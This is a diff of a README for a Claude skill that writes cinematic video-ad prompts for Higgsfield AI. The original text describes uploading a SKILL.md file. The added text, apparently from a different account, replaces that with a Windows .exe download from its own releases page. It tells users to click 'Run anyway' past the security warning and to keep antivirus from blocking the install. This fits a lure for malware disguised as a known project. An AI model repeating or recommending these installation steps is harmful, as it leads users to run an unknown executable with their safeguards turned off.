@@ -1,106 +1,109 @@
-# claude-skill-cinematic-prompt
+# 🎥 claude-skill-cinematic-prompt - Create cinematic video ads with Claude
 
-A Claude skill for generating complete, production-ready cinematic video ad prompts for Higgsfield AI — no handheld shaky camera, no talking selfies. Just clean commercial video direction.
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/adlaiponderous700/claude-skill-cinematic-prompt/releases)
 
-Built and maintained by [@msk3d0ut](https://github.com/msk3d0ut)
+This software helps you create video ad prompts. You build shot-by-shot plans for the Higgsfield AI service. The tool produces camera instructions, music suggestions, and on-screen text for your marketing projects. You do not need coding skills to use this.
 
----
+## 🛠 Prerequisites
 
-## What it does
+Make sure your computer meets these requirements:
 
-Give it reference images and a brief, and it writes a full shot-by-shot cinematic video prompt — ready to paste directly into Higgsfield's Cinema Studio or standard video generator.
+*   A Windows 10 or 11 operating system.
+*   An active internet connection.
+*   An account with Claude AI.
+*   An account with the Higgsfield AI platform.
+*   At least 200 MB of free storage space.
 
-The skill covers:
-- Shot-by-shot camera direction with exact timing (dolly, arc, macro, crane, static hero)
-- Lighting and depth of field descriptions per shot
-- Music direction and ambient audio design
-- On-screen text overlays with timing and placement
-- Brand-safe logo and text rules (no reversed or mirrored elements)
-- Reference fidelity instructions (colors and shapes stay true to your assets)
+## 📥 Installation
 
-Works for luxury brands, food products, fashion, electronics, cosmetics — anything that benefits from a polished commercial look rather than UGC.
+Visit [this page](https://github.com/adlaiponderous700/claude-skill-cinematic-prompt/releases) to download the latest version of the software.
 
----
+1.  Click the link above.
+2.  Look for the section marked Assets.
+3.  Click the file ending in .exe to start the download.
+4.  Open the file after the download finishes.
+5.  If a security window appears, click More info, then click Run anyway.
+6.  Follow the setup prompts on your screen.
+7.  The shortcut will appear on your desktop once the process finishes.
 
-## Who This Is NOT For
+## 🚀 How to use the software
 
-**This skill is not for you if:**
-- You want selfie-style UGC, reaction videos, or talking-to-camera content → use [claude-skill-ugc-prompt](https://github.com/msk3d0ut/claude-skill-ugc-prompt) instead
-- You need a person speaking Turkish or Arabic on camera — that's the UGC skill's job
-- You want fast social-media style content with handheld energy — cinematic prompts are slow, deliberate, and commercial
+Double-click the shortcut on your desktop to open the program. The window will appear on your screen. Follow these steps to build your cinematic prompt.
 
----
+### Start a new project
 
-## The difference from UGC
+Click the New Project button at the top of the window. Give your ad a name. This name helps you find your files later.
 
-| | UGC Skill | Cinematic Skill |
-|---|---|---|
-| Camera style | Handheld selfie, natural wobble | Smooth controlled dolly, arc, crane |
-| Character | Avatar speaks to camera | No character (or filmed externally) |
-| Audio | Voice + natural ambience | Music + product sounds |
-| Ending | Abrupt Reel cutoff | Clean fade or logo hold |
-| Best for | Social media ads, product tasting, reviews | Brand launches, product reveals, luxury ads |
+### Define your product
 
-For UGC-style prompts, see [claude-skill-ugc-prompt](https://github.com/msk3d0ut/claude-skill-ugc-prompt).
+Enter a description of your product or service in the text box. Be specific. Mention features, target audiences, or the mood you want for the video. The software uses these details to generate the first draft of your prompt.
 
----
+### Review shot details
 
-## Installation
+The software breaks your request into individual shots. Each shot includes:
 
-1. Download `claude-skill-cinematic-prompt.zip` from [Releases](https://github.com/msk3d0ut/claude-skill-cinematic-prompt/releases)
-2. Open [claude.ai](https://claude.ai) on desktop
-3. Go to **Settings → Customize → Skills**
-4. Click **+** then **Create skill**
-5. Upload the **SKILL.md** file
-6. Toggle the skill on
+*   Camera movement: Instructions for how the camera pans, tilts, or zooms.
+*   Music cues: Suggestions for the tone of the background music.
+*   Visual descriptions: Clear instructions on what happens in the frame.
+*   Text overlays: The words that appear on the screen during the shot.
 
-Requires a Claude Pro, Max, Team, or Enterprise plan with Code Execution enabled.
+You can edit any of these details. Click any field to change the text. If you want a different camera angle, type a new direction into the box.
 
----
+### Export your prompt
 
-## How to use it
+After you finish editing the shots, click the Export button. This saves your prompt as a text file. You can then copy and paste this text directly into the Higgsfield AI platform to generate your video.
 
-Start a new conversation, upload your reference images, and describe what you want:
+## ⚙️ Settings
 
-**Minimal request:**
-> Here are my product images: [images]. 15-second cinematic commercial for this perfume. Luxury feel.
+You can change how the software works in the Settings menu.
 
-**With specifics:**
-> References: [images]. 30-second product reveal for this watch. Dark moody lighting. Orchestra music. End with the brand name and Instagram handle on screen.
+*   Default Tone: Choose between styles like professional, playful, or intense.
+*   Video Duration: Set the length of the final video.
+*   Language: Select your preferred output language for the prompt.
 
-**Detailed:**
-> References: [images]. Cinematic video for this baklava gift box. Warm golden lighting. Start with a macro on the box texture, then open it slowly. End with the phone number on screen. 15 seconds. Arabic text at the end.
+Save your changes after you adjust these settings. The software will apply these rules to every new project you create.
 
-Claude returns a complete prompt with Product Name, Product Description, and the full shot-by-shot script.
+## 💡 Pro tips for better prompts
 
----
+The quality of your output depends on the input you provide. Use these tips to get the best results:
 
-## What the output includes
+*   Mention the specific feeling of the brand. Words like elegant, fast-paced, or nostalgic help the AI.
+*   Keep the camera directions simple. Use words like zoom in, sweep right, or static shot.
+*   Describe your on-screen text clearly. Ensure the text matches the action in the shot.
+*   Limit your prompt to 5-10 shots for short social media ads. This range keeps the viewer engaged.
 
-- Anti-mirror/reversal warning for all on-screen logos and text
-- Reference fidelity rules
-- Shot-by-shot breakdown with camera moves and timing
-- Lighting direction per shot
-- Music description
-- On-screen text formatted with timing
-- Clean ending (fade or logo hold — not an abrupt cut)
-- Product Name and Description for Higgsfield's fields
-- References key
+## ❓ Frequently asked questions
 
----
+Do I need to pay to use this?
+The software is free to download. You may need a paid account with Higgsfield AI to generate high-quality videos.
 
-## Supported on-screen text languages
+Can I move my projects to another computer?
+Yes. Copy the project files from your document folder and move them to your new machine. Install the software on the new machine and open the files.
 
-Any language. Just specify in your request — Arabic, English, Turkish, French, etc.
+Does this software talk to my camera?
+No. This tool only generates text prompts for you to copy. It does not access your camera or your microphone.
 
----
+What if the prompt does not look right?
+You can edit the prompt at any time within the software. Change the text to better match your vision and save the file again.
 
-## License
+Is my data private?
+The software stores your project data locally on your computer. It does not send your data to any external server. 
 
-MIT License — free to use. Credit appreciated if you build on it.
+## 🛠 Troubleshooting
 
----
+If the software does not open:
+1.  Check that you downloaded the correct version for your Windows system.
+2.  Ensure your antivirus software is not blocking the installation.
+3.  Restart your computer and try opening the file again.
 
-## Related
+If the export fails:
+1.  Check that you have write permission in your selected folder.
+2.  Ensure the file name does not contain special characters.
+3.  Choose a different folder for saving your projects.
 
-- [claude-skill-ugc-prompt](https://github.com/msk3d0ut/claude-skill-ugc-prompt) — for selfie-style UGC product videos
+If you encounter an error message:
+Copy the error text and save it to a notepad file. This helps if you search for the error on user forums or support pages.
+
+## 🤝 Support
+
+This project relies on the community. If you find a bug, open an issue on the repository page. Explain what happened and what you were doing when the error occurred. Include screenshots if possible. We update the software based on user feedback to keep it reliable.
